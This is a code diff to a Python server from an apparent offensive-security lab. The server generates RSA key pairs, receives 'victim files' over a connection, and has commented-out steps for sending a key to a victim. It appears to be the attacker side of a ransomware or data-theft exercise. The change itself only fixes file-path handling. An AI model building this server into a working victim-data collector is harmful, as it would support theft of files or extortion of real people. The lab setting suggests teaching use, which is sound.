@@ -69,10 +69,10 @@ class Server:
     def generate_key_pair(self):
         public_key, private_key = rsa.newkeys(2048)
 
-        with open(Server.WORKING_DIR + '/public.pem', 'wb') as f:
+        with open(os.path.join(Server.WORKING_DIR , 'public.pem'), 'wb') as f:
             f.write(public_key.save_pkcs1('PEM'))
 
-        with open(Server.WORKING_DIR + '/private.pem', 'wb') as f:
+        with open(os.path.join(Server.WORKING_DIR, 'private.pem'), 'wb') as f:
             f.write(private_key.save_pkcs1('PEM'))
 
     def receive_victim_files(self, conn, mac):
@@ -114,20 +114,16 @@ class Server:
                         else:
                             raise
 
-
-                    #priv, pub = self.generate_key_pair()
-
-                    #self.make_dir('Keys')
+                    #self.generate_key_pair()
                     
-                    #command to save the private and public key in /home/attacker/Lab-On-Offensive-Attack/VictimsData
-
-                    #key_name = base64.b64encode('keyname'.encode(SERVER.FORMAT))
+                    #key_name = base64.b64encode('public.pem'.encode(SERVER.FORMAT))
                     #connection.sendall(key_name)
 
-                    #key = base64.b64encode('key file'.encode(SERVER.FORMAT))
+                    # file = open(os.path.join(Server.WORKING_DIR, key_name), "rb")
+                    # key_data = file.read()
+                    #key = base64.b64encode(key_data.encode(SERVER.FORMAT))
 
                     #connection.sendall(key)
-                    generate_key_pair(self)
 
                     while not self.TRANSFER_DONE:
                         self.receive_victim_files(connection)
